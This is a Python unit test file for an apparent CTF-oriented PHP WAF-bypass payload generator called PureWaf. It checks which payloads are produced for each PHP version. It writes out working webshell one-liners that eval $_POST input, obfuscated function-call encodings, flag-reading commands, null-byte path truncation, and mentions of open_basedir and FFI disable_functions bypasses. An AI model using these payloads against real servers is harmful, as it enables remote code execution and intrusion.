import sys
import os
import unittest

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from PureWaf import bypass
from PureWaf.auto import AutoContext

class TestPHPVersions(unittest.TestCase):
    def test_php5_restrictions(self):
        """
        测试低版本模式
        """
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=True,
            php_version=5.6
        )
        payloads = bypass.generate_candidates(options)
        
        # 验证不存在高版本专属载荷（如 (~...)(...)）
        for p in payloads:
            # 当前逻辑会过滤以 "(" 开头且以 ");" 结尾的载荷
            if p.startswith("(") and p.endswith(");"):
                self.fail(f"Found PHP7 payload in PHP5 mode: {p}")
                
    def test_php7_features(self):
        """
        测试高版本模式
        """
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=True,
            php_version=7.4
        )
        payloads = bypass.generate_candidates(options)
        
        # 验证存在高版本专属载荷
        # 该表达式对应目标函数调用
        found = False
        target = "(~%8F%97%8F%96%91%99%90)();"
        for p in payloads:
            if target in p:
                found = True
                break
        self.assertTrue(found, f"PHP7 payload {target} not found in PHP7 mode")

    def test_upload_on_php5(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=True,
            php_version=5.6,
            upload=True,
        )
        payloads = bypass.generate_candidates(options)
        self.assertIn("<% phpinfo(); %>", payloads)
        self.assertIn("<%=phpinfo()%>", payloads)
        self.assertIn('<script language="php">phpinfo();</script>', payloads)

    def test_upload_on_php7(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=True,
            php_version=7.4,
            upload=True,
        )
        payloads = bypass.generate_candidates(options)
        self.assertNotIn("<% phpinfo(); %>", payloads)
        self.assertNotIn("<%=phpinfo()%>", payloads)
        self.assertNotIn('<script language="php">phpinfo();</script>', payloads)

    def test_php56_legacy_execution_payloads(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=True,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=5.6,
        )
        payloads = bypass.generate_candidates(options)
        joined = "\n".join(payloads)

        self.assertIn("assert($_POST[x]);", payloads)
        self.assertIn("preg_replace('/.*/e', $_POST[x], 'x');", payloads)
        self.assertIn("$__=create_function('', $_POST[x]);$__();", payloads)
        self.assertNotIn("'system'(", joined)

    def test_php74_keeps_deprecated_create_function_but_not_preg_replace_e(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=True,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=7.4,
        )
        payloads = bypass.generate_candidates(options)

        self.assertIn("assert($_POST[x]);", payloads)
        self.assertIn("$__=create_function('', $_POST[x]);$__();", payloads)
        self.assertNotIn("preg_replace('/.*/e', $_POST[x], 'x');", payloads)

        record = bypass.build_payload_record("$__=create_function('', $_POST[x]);$__();")
        self.assertEqual(record.deprecated_from, "7.2")
        self.assertEqual(record.max_php, "7.4")

    def test_php8_removes_string_assert_and_create_function_payloads(self):
        options = bypass.BypassOptions(
            flagfile=None,
            read_env=False,
            reflect_shell=True,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version=8.0,
        )
        payloads = bypass.generate_candidates(options)
        joined = "\n".join(payloads)

        self.assertNotIn("assert($_POST[x]);", payloads)
        self.assertNotIn("create_function", joined)
        self.assertNotIn("preg_replace('/.*/e'", joined)

    def test_php85_backticks_are_kept_but_marked_deprecated(self):
        record = bypass.build_payload_record("`cat /flag`")

        self.assertEqual(record.deprecated_from, "8.5")
        self.assertIn("shell_exec enabled", record.requirements)
        self.assertIn("shell_backticks", record.techniques)

    def test_legacy_null_byte_truncation_is_version_sensitive(self):
        record = bypass.build_payload_record("/flag%00.php", payload_context="file_path")

        self.assertEqual(record.max_php, "5.3.3")
        self.assertEqual(record.compatibility_confidence, "version_sensitive")
        self.assertIn("legacy null-byte path truncation", record.requirements)
        self.assertFalse(bypass._payload_matches_runtime("/flag%00.php", "8.0", payload_context="file_path"))

    def test_null_byte_interleave_is_transform_sensitive_not_version_limited(self):
        record = bypass.build_payload_record("f%00l%00a%00g", payload_context="file_path")

        self.assertEqual(record.max_php, "")
        self.assertEqual(record.compatibility_confidence, "contextual")
        self.assertIn(
            "transform/preprocessor must drop or ignore inserted NUL bytes before the sink",
            record.requirements,
        )
        self.assertTrue(bypass._payload_matches_runtime("f%00l%00a%00g", "8.0", payload_context="file_path"))

    def test_patch_version_string_filters_php83_open_basedir_relaxation(self):
        ctx = AutoContext(
            sink_function="eval",
            open_basedir="/var/www/html",
            php_version_hint=8.3,
        )
        options = bypass.BypassOptions(
            flagfile="/flag",
            read_env=False,
            reflect_shell=False,
            ip="127.0.0.1",
            port=8080,
            phpinfo=False,
            php_version="8.3.18",
            upload=False,
            payload_context="any",
            auto_context=ctx,
        )
        payloads = bypass.generate_candidates(options)

        self.assertFalse(any("ini_set('open_basedir','..')" in p for p in payloads))

    def test_ffi_disable_functions_payload_requires_php74(self):
        old_ctx = AutoContext(sink_function="eval", disable_functions=["system"], php_version_hint=7.3)
        new_ctx = AutoContext(sink_function="eval", disable_functions=["system"], php_version_hint=7.4)

        old_payloads = bypass.generate_candidates(
            bypass.BypassOptions("/flag", False, False, "127.0.0.1", 8080, False, 7.3, False, "any", old_ctx)
        )
        new_payloads = bypass.generate_candidates(
            bypass.BypassOptions("/flag", False, False, "127.0.0.1", 8080, False, 7.4, False, "any", new_ctx)
        )

        self.assertFalse(any("FFI::cdef" in p for p in old_payloads))
        self.assertTrue(any("FFI::cdef" in p for p in new_payloads))

if __name__ == '__main__':
    unittest.main()
